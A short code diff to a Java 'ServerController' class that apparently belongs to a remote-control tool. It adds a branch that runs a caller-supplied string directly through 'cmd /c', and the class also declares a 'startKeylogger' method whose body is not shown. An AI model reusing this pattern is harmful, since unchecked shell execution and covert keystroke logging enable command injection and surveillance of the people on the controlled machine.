@@ -222,6 +222,8 @@ public class ServerController {
     {
         ProcessBuilder processBuilder = new ProcessBuilder();
         processBuilder.command("cmd", "/c,", "start", name);
+        if (name.charAt(0) == '"')
+            processBuilder.command("cmd", "/c,", name);
         processBuilder.start();
     }
     public void startKeylogger() throws NativeHookException {
